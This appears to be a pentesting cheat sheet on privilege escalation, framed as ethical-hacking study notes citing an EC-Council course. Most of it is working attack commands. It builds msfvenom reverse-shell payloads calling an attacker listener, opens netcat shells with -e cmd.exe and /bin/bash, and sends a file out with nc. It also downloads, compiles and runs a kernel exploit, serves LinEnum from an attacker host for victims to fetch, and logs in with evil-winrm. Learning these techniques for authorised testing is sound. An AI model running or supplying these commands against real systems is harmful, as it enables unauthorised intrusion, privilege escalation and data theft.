---
title: Privilege Escalation Tools and Techniques
summary: Understand Privilege Escalation and use of tools
description: Understand Privilege Escalation and use of tools
slug: '/privilege-escalation-tool-and-techniques'
tags: ['privilege escalation', 'penetration testing', 'ethical hacking']
categories: ['ethical hacking']
---

## Reverse Shell

Take advantage of the target system's vulnerabilities to initiate a shell session. Here, listener is attacker.

```bash
# Windows Server
msfvenom -p windows/shell_reverse_tcp LHOST=<listener-ip-addr> LPORT=<listener-port> -f exe > shell-x64.exe

nc -lvp <listener-port>

# Now, after you download and run the app. We get the access to victim's shell.

# Java Server
msfvenom -p java/jsp_shell_reverse_tcp lhost=<listener-ip-addr> lport=<listener-port> -f war > shell.war
```

### WinPEAS

```powershell
WinPEASx65.exe systeminfo log=systeminfo.txt # Privilege Escalation
```

### netcat

#### Windows

```powershell
ncat.exe -lp 52000 # Start listening at port 52000

netstat -an | more

# If file doesn't exist it will be created else cleared and redirected.
ncat.exe -lp 55555 > alice.txt
# Append in a file instead.
ncat.exe -lp 55555 >> alice.txt

ncat.exe -lp 10314 -e cmd.exe # -e is executable i.e. cmd.exe

ncat.exe <target-linux-ip-addr> 14618 # Bash shell from Linux
```

#### Linux

```bash
nc <target-windows-ip-addr> 52000 # Linux

# Send content of the bob.txt file.
nc -w 1 <target-windows-ip-addr> 5555 < bob.txt
# If the connection and stdin are idle for more than timeout seconds,
# the connection is closed silently. Default is no timeout.
# `nc` will listen forever for a connection, with or without the -w flag.

nc <target-windows-ip-addr> 10314 # Windows prompt from Linux

nc -lp 14618 -e /bin/bash # bash as executable.

nc -nlvp 5555
# -n: no DNS or service lookups on any addresses, hostnames or port names.
# -l: listen for an incoming connection.
# -v: give more verbose output.
# -p: to specify the local port number.
```

> Note: `>` is output redirection character, `<` is input redirection character.

## exploit-db.com

Based on Linux kernal, VulnOS -> `37292`

```bash
whoami

wget https://www.exploit-db.com/exploits/44298 -O exploit.c

gcc exploit.c -o exploit
chmod 777 exploit
./exploit

whoami
```

## LinEnum

```bash
# Attacker Server
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum # or Copy RAW to to LinEnum file.

chmod +x LinEnum

python -m http.server 8000 # Serving http server to host a file to download.

# Victim Client
wget http://<attacker-ip-addr>:8000/LinEnum

./LinEnum
```

## Gobuster - Directory Traversal

```bash
# -u assign target
# -w word list
# -x is list of extensions
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <target-ip-addr>

gobuster dir -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html -u <target-ip-addr>
```

## Spawning Bash Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' # Pseudo-terminal utilities
```

## Root Login on NOPASSWD Sudoer

> `sudo -l`: This command is used to list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.

> `sudo -i`: This command, also known as sudo --login, starts a new shell as the target user (root by default), and changes to their home directory.

## Window Remote Management (WinRM)

```bash
evil-winrm -i <target-windows-ip-addr> -u 'admin' -p 'pass'
```

> Which metasploit module can be used in this case to abuse Windows Remote Management?
> **auxiliary/scanner/winrm/winrm_login**

## Reference

- https://github.com/ec-council-learning/Pentesting-Fundamentals-for-Beginners
